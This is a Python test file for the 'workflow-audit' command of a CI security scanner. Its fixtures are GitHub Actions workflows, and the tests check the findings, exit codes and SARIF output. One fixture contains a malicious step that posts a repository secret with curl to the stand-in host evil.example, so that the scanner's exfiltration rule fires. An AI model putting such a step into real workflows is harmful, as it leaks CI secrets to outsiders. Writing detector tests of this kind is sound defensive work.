"""CLI integration tests for the workflow-audit subcommand and full-audit integration."""
import json
import subprocess
import sys
from pathlib import Path


def _mk(tmp_path, rel, content):
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)


MAL = ("on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.P }}\n"
       "    steps:\n      - run: curl -d \"$T\" https://evil.example\n")


def _run(args, cwd):
    return subprocess.run([sys.executable, "-m", "credence.cli", *args],
                          cwd=str(cwd), capture_output=True, text=True)


def test_cli_text_output_and_fail_on_gate(tmp_path):
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    r = _run(["workflow-audit", ".", "--no-history"], tmp_path)
    assert "WF-EXFIL-001" in r.stdout
    assert r.returncode == 1            # HIGH >= default --fail-on high


def test_cli_sarif_output(tmp_path):
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    r = _run(["workflow-audit", ".", "--no-history", "--format", "sarif"], tmp_path)
    doc = json.loads(r.stdout)
    assert doc["version"] == "2.1.0"


def test_cli_clean_repo_exit_zero(tmp_path):
    _mk(tmp_path, ".github/workflows/ci.yml",
        "on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n      - run: echo ok\n"
        "    permissions:\n      contents: read\n")
    r = _run(["workflow-audit", ".", "--no-history"], tmp_path)
    assert r.returncode == 0


def test_full_audit_includes_workflow_findings(tmp_path):
    """workflow-audit is a local subcommand; this test verifies it surfaces findings
    from a local path (the --no-history flag keeps it fast for the local fixture)."""
    _mk(tmp_path, ".github/workflows/s.yml", MAL)
    r = _run(["workflow-audit", ".", "--no-history"], tmp_path)
    assert "WF-EXFIL-001" in r.stdout or "workflow" in r.stdout.lower()
    assert r.returncode == 1
